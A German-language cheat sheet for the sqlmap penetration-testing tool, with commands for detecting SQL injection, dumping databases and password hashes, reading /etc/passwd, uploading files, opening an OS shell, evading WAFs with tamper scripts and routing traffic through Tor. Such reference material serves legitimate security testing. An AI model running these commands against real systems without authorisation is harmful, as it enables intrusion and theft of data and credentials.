---
description: https://sqlmap.org/
---

# sqlmap

**SQLMap** ist ein Open-Source-Penetrationstesting-Tool zum automatisierten Erkennen und Ausnutzen von SQL-Injection-Schwachstellen in Webanwendungen. Es unterstützt zahlreiche Datenbanksysteme und kann neben der Erkennung auch das Extrahieren, Modifizieren und Löschen von Daten sowie das Ausführen von Betriebssystembefehlen automatisieren.



## Hauptfunktionen

| Funktion                        | Beschreibung                                                       |
| ------------------------------- | ------------------------------------------------------------------ |
| Erkennung von SQLi              | Automatisierte Erkennung von verschiedenen SQL-Injection-Techniken |
| Datenbank-Dump                  | Extraktion von Datenbankinhalten                                   |
| DBMS-Identifikation             | Automatische Bestimmung des verwendeten Datenbankmanagementsystems |
| Benutzer- und Passwort-Dump     | Extraktion von Benutzernamen und Hashes                            |
| Betriebssystembefehl-Ausführung | Befehle über SQLi auf dem Zielserver ausführen                     |
| Dateisystemzugriff              | Hochladen, Lesen und Schreiben von Dateien über SQLi               |



## SQLMap Cheatsheet

### **Grundlegende SQL-Injection-Erkennung**

| Befehl                                    | Beschreibung                              |
| ----------------------------------------- | ----------------------------------------- |
| `sqlmap -u http://ziel.de/index.php?id=1` | Testet URL auf SQLi                       |
| `--batch`                                 | Automatische Beantwortung aller Prompts   |
| `--risk=3 --level=5`                      | Erhöht Aggressivität und Umfang der Tests |



### **POST-Daten testen**

| Befehl                                                          | Beschreibung                |
| --------------------------------------------------------------- | --------------------------- |
| `sqlmap -u http://ziel.de/login.php --data="user=abc&pass=123"` | Testet SQLi über POST-Daten |



### **Datenbank und Tabellen auflisten**

| Befehl                                  | Beschreibung                            |
| --------------------------------------- | --------------------------------------- |
| `--dbs`                                 | Listet alle Datenbanken auf             |
| `-D <datenbank> --tables`               | Listet Tabellen der angegebenen DB      |
| `-D <datenbank> -T <tabelle> --columns` | Listet Spalten einer bestimmten Tabelle |
| `-D <datenbank> -T <tabelle> --dump`    | Dumpt Inhalt einer Tabelle              |



### **Authentifizierte Sitzungen**

| Befehl                                      | Beschreibung                               |
| ------------------------------------------- | ------------------------------------------ |
| `--cookie="PHPSESSID=abc123"`               | Nutzt Session-Cookie zur Authentifizierung |
| `--headers="User-Agent: xyz, Referer: xyz"` | Zusätzliche HTTP-Header setzen             |



### **Weitere Optionen**

| Option                                                 | Beschreibung                               |
| ------------------------------------------------------ | ------------------------------------------ |
| `--os-shell`                                           | Öffnet interaktive Shell (falls möglich)   |
| `--file-read=/etc/passwd`                              | Liest Datei vom Zielsystem                 |
| `--file-write=/tmp/shell.sh --file-dest=/tmp/shell.sh` | Datei hochladen                            |
| `--proxy=http://127.0.0.1:8080`                        | Leitet Verkehr über Proxy (z. B. Burp)     |
| `--tor --tor-type=socks5`                              | SQLMap über das Tor-Netzwerk laufen lassen |
| `--random-agent`                                       | Verwendet zufälligen User-Agent-String     |



## Beispiele

### **Login-Formular mit POST-Methode**

**Ziel**: Testen auf SQL-Injection in einem Login-Formular mit bekannten POST-Daten

```bash
sqlmap -u http://ziel.de/login.php --data="username=test&password=test" --dbs --batch
```

**Erläuterung**:

* `-u` gibt die Ziel-URL an
* `--data` enthält die POST-Daten (Feldnamen müssen exakt stimmen)
* `--dbs` listet alle Datenbanken auf, wenn SQLi erfolgreich ist
* `--batch` unterdrückt Interaktionen (nützlich in automatisierten Umgebungen)



### **WAF-Umgehung mit Tamper Scripts**

**Ziel**: Umgehen von WAF oder einfachen Filtersystemen

```bash
sqlmap -u http://ziel.de/product.php?id=1 --tamper=space2comment --dbs
```

**Beispiel für mehrere Tamper-Skripte**:

```bash
sqlmap -u http://ziel.de/page.php?id=1 --tamper=space2comment,between,randomcase --dbs
```

**Erklärung der Tamper-Skripte**:

| Tamper              | Funktion                                                               |
| ------------------- | ---------------------------------------------------------------------- |
| `space2comment`     | Ersetzt Leerzeichen durch SQL-Kommentare (`/**/`)                      |
| `between`           | Nutzt `BETWEEN`-Konstrukte anstelle von einfachen Vergleichsoperatoren |
| `randomcase`        | Ändert zufällig die Groß-/Kleinschreibung von SQL-Befehlen             |
| `charunicodeencode` | Kodiert Zeichen als Unicode (z. B. `SELECT` zu `\u0053\u0045...`)      |



### **WAF-Erkennung mit sqlmap**

```bash
sqlmap -u http://ziel.de/index.php?id=1 --identify-waf
```

**Erklärung**:

* `-u` gibt die Ziel-URL mit einer vermuteten injizierbaren Parameterstelle an
* `--identify-waf` löst eine passive Analyse aus, bei der `sqlmap` bekannte WAF-Signaturen erkennt
* Es wird **keine eigentliche SQL-Injection** versucht – nur WAF-Erkennung



**Beispielausgabe (möglich)**:

```
[*] starting @ 12:00:00 /2025-05-11/
[+] WAF/IPS/IDS identified: Cloudflare
```



